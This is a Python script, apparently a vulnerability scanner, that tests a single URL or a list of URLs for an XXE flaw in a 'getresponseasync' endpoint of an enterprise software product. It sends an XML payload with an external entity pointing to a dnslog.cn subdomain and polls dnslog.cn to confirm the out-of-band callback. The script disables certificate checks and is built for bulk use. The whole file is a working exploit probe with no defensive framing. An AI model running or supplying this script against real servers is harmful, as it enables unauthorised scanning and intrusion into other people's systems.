import requests
import urllib3
import re,string,random
from urllib.parse import urljoin
import argparse
import time
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    taeget_url = urljoin(url, "/ItfServerRS/rest/ideas/getresponseasync")
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        getdomain = requests.get(url='http://dnslog.cn/getdomain.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
        domain = str(getdomain.text)
        data = f"""<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://123.{domain}"> %remote;]>"""
        requests.post(taeget_url, verify=False, headers=headers, data=data, timeout=15)
        for i in range(0, 3):
            refresh = requests.get(url='http://dnslog.cn/getrecords.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
            time.sleep(1)
            if domain in refresh.text:
                print(f"\033[31mDiscovered:{url}: XiRuanYunXMS_getresponseasync_XXE!\033[0m")
                return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")